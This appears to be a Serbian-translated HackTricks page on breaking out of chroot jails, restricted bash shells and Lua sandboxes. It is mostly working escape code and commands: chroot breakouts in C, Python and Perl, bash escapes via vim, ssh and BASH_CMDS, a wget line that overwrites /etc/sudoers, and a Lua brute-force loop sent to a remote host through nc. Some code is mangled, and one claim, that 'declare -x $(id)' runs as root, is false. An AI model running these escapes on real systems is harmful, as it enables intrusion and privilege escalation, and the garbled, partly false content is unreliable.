# Escaping from Jails

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **GTFOBins**

**Pretražite na** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da li možete izvršiti bilo koji binarni fajl sa "Shell" svojstvom**

## Bekstvo iz Chroot-a

Sa [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Chroot mehanizam **nije namenjen** za odbranu od namernog menjanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne stapaju pravilno i chroot-ovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi pobegli**.\
Obično to znači da da biste pobegli, morate biti root unutar chroot-a.

{% hint style="success" %}
**Alat** [**chw00t**](https://github.com/earthquake/chw00t) je napravljen da zloupotrebi sledeće scenarije i pobegne iz `chroot`-a.
{% endhint %}

### Root + Trenutni radni direktorijum

{% hint style="warning" %}
Ako ste **root** unutar chroot-a, možete pobeći tako što ćete kreirati **još jedan chroot**. Ovo je moguće jer dva chroot-a ne mogu postojati istovremeno (u Linux-u), pa ako kreirate folder, a zatim **kreirate novi chroot** u tom novom folderu, a vi se nalazite **izvan njega**, sada ćete biti **izvan novog chroot-a** i stoga ćete biti u FS-u.

Ovo se dešava jer chroot obično NE menja vaš trenutni radni direktorijum na određeni, tako da možete kreirati chroot, ali biti izvan njega.
{% endhint %}

Obično nećete pronaći binarni fajl `chroot` unutar chroot zatvora, ali **možete kompajlirati, otpremiti i izvršiti** binarni fajl:

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }

````
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
````

</details>

<details>

<summary>Perl</summary>

\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`

</details>

### Root + Sačuvani fd

{% hint style="warning" %}
Ovo je slično kao i prethodni slučaj, ali u ovom slučaju **napadač čuva file deskriptor za trenutni direktorijum** i zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **van** chroot-a, pristupa mu i **izlazi**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }

````
</details>

### Root + Fork + UDS (Unix Domain Sockets)

<div data-gb-custom-block data-tag="hint" data-style='warning'>

FD može biti prosleđen preko Unix Domain Sockets, pa:

* Kreirajte child proces (fork)
* Kreirajte UDS tako da roditelj i dete mogu da komuniciraju
* Pokrenite chroot u child procesu u drugom folderu
* U roditeljskom procesu, kreirajte FD foldera koji je van novog chroot-a deteta
* Prosledite tom FD-u detetu koristeći UDS
* Dete promeni direktorijum na taj FD, i zato što je van svog chroot-a, ono će izaći iz zatvora

</div>

### &#x20;Root + Mount

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Montirajte root uređaj (/) u direktorijum unutar chroot-a
* Chroot u taj direktorijum

Ovo je moguće u Linuxu

</div>

### Root + /proc

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Montirajte procfs u direktorijum unutar chroot-a (ako već nije)
* Potražite pid koji ima drugačiji root/cwd unos, kao što je: /proc/1/root
* Chroot u taj unos

</div>

### Root(?) + Fork

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Kreirajte Fork (child proces) i chroot u drugi folder dublje u FS i CD na njega
* Iz roditeljskog procesa, premestite folder u kojem se nalazi child proces u folder prethodan chroot-u dece
* Ovaj child proces će se naći van chroot-a

</div>

### ptrace

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Ranije je korisnicima bilo moguće da debaguju svoje procese iz procesa samog sebe... ali ovo više nije moguće podrazumevano
* U svakom slučaju, ako je moguće, možete ptrace-ovati proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap\_sys\_ptrace)).

</div>

## Bash Zatvori

### Enumeracija

Dobijte informacije o zatvoru:
```bash
echo $SHELL
echo $PATH
env
export
pwd
````

#### Izmena PATH-a

Proverite da li možete izmeniti promenljivu okruženja PATH.

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

#### Korišćenje vim-a

Vim je moćan tekstualni editor koji se često koristi u Linux okruženju. Može se koristiti za uređivanje fajlova, ali takođe može biti koristan alat za eskalaciju privilegija.

Da biste koristili vim za eskalaciju privilegija, prvo morate pronaći fajl koji ima postavljene privilegije koje vam omogućavaju da ga menjate. Zatim možete koristiti sledeće korake:

1. Pokrenite vim sa privilegijama korisnika koji ima dozvolu za izmenu fajla. Na primer, možete pokrenuti `sudo vim` da biste dobili privilegije root korisnika.
2. U vim-u, koristite komandu `:e /etc/passwd` da biste otvorili fajl `/etc/passwd` za uređivanje. Ovde možete uneti bilo koji fajl koji ima odgovarajuće privilegije.
3. Kada se fajl otvori, možete izmeniti njegov sadržaj. Na primer, možete dodati novog korisnika ili promeniti privilegije postojećeg korisnika.
4. Kada završite sa izmenama, sačuvajte fajl koristeći komandu `:wq`.

Napomena: Korišćenje vim-a za eskalaciju privilegija zahteva odgovarajuće privilegije i može biti opasno. Uvek budite pažljivi prilikom izmene sistema fajlova i koristite ovu tehniku samo u legitimne svrhe.

```bash
:set shell=/bin/sh
:shell
```

#### Kreiranje skripte

Proverite da li možete kreirati izvršnu datoteku sa sadržajem _/bin/bash_.

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

#### Dobijanje bash-a putem SSH-a

Ako pristupate putem SSH-a, možete koristiti ovaj trik da biste izvršili bash shell:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

#### Deklaracija

Kada se bavimo eskalacijom privilegija, prvi korak je da proverimo da li imamo pristup ograničenom shell-u, kao što je Bash shell. Ograničeni shell obično ima neke funkcionalnosti onemogućene kako bi se sprečilo izvršavanje neovlašćenih komandi. Međutim, postoje načini da se izbegne ova ograničenja i dobije potpuni pristup sistemu.

Jedan od načina da se izbegne ograničeni shell je da se koristi `declare` komanda. Ova komanda se koristi za deklarisanje promenljivih i funkcija u shell-u. Međutim, može se koristiti i za izvršavanje proizvoljnog koda.

Da biste koristili `declare` komandu za eskalaciju privilegija, prvo morate proveriti da li je dostupna. Možete to uraditi tako što ćete pokrenuti `type declare` komandu. Ako je `declare` komanda dostupna, možete je koristiti za izvršavanje koda sa privilegijama korisnika koji je pokrenuo ograničeni shell.

Na primer, možete koristiti `declare` komandu da biste pokrenuli `id` komandu sa privilegijama korisnika `root`. To možete uraditi na sledeći način:

```bash
declare -x $(id)
```

Ova komanda će izvršiti `id` komandu i prikazati informacije o trenutnom korisniku sa privilegijama `root`.

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

#### Wget

Možete prebrisati na primer sudoers fajl.

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

#### Ostale trikove

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Takođe, može biti interesantna stranica:**

### Python zatvori

Trikovi za izlazak iz python zatvora na sledećoj stranici:

### Lua zatvori

Na ovoj stranici možete pronaći globalne funkcije do kojih imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval sa izvršavanjem komandi:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Enumeriraj funkcije biblioteke:

```bash
for k,v in pairs(string) do print(k,v) end
```

Napomena da svaki put kada izvršite prethodnu jednolinijsku komandu u **različitom lua okruženju, redosled funkcija se menja**. Stoga, ako želite da izvršite određenu funkciju, možete izvršiti napad metodom iscrpne pretrage učitavanjem različitih lua okruženja i pozivanjem prve funkcije biblioteke "le".

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Dobijanje interaktivne Lua ljuske**: Ako se nalazite unutar ograničene Lua ljuske, možete dobiti novu Lua ljusku (i nadamo se neograničenu) pozivanjem:

```bash
debug.debug()
```

### Reference

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))



</details>
